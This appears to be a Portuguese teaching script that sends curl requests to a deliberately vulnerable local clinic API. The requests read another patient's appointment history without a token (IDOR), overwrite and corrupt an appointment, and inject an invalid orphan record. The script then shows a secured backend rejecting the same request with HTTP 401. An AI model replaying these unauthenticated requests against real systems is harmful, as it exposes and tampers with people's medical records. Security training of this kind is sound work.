#!/usr/bin/env bash
# =============================================================================
# DEMONSTRACAO DE LABORATORIO - corrupcao de dados sem autenticacao.
# Alvo: o backend VULNERAVEL local (http://localhost:8080). Uso didatico apenas.
# NAO usar contra sistemas de terceiros.
#
# Mostra que, sem token e sem verificacao de dono, um atacante consegue:
#   1. LER o historico de outro paciente (IDOR)
#   2. REESCREVER (corromper) uma consulta alheia
#   3. INJETAR um registo invalido/orfao
#   4. APAGAR uma consulta alheia
# =============================================================================
set -u
API="http://localhost:8080/api"
linha() { echo "------------------------------------------------------------"; }

echo "### ALVO: $API  (backend VULNERAVEL)"
linha
echo "[1] ANTES - historico do paciente 2 (Bruno), lido SEM token (IDOR):"
curl -s "$API/consultas/paciente/2"; echo

linha
echo "[2] ATAQUE - reescrever a consulta 3 (do Bruno) SEM token:"
curl -s -X PUT "$API/consultas/3" \
  -H "Content-Type: application/json" \
  -d '{"data":"1900-01-01 00:00","procedimento":"CORROMPIDO","dentista":"-","observacoes":"dados adulterados pelo atacante","estado":"CANCELADA"}'; echo

linha
echo "[3] ATAQUE - injetar registo invalido/orfao (paciente inexistente):"
curl -s -X POST "$API/consultas" \
  -H "Content-Type: application/json" \
  -d '{"pacienteId":999,"nomePaciente":"","data":"data-invalida","procedimento":"","estado":"NAO_EXISTE"}'; echo

linha
echo "[4] DEPOIS - historico do paciente 2 novamente (ja corrompido):"
curl -s "$API/consultas/paciente/2"; echo

linha
echo "### Mesmo ataque contra o backend SEGURO (8082) - deve FALHAR:"
echo "    PUT sem token ->"
curl -s -o /dev/null -w "      HTTP %{http_code}\n" -X PUT "http://localhost:8082/api/consultas/3" \
  -H "Content-Type: application/json" -d '{"procedimento":"x"}'
echo "    (401 = bloqueado por falta de autenticacao)"
linha
echo "Para repor os dados vulneraveis: ver README (recriar schema public / reiniciar)."
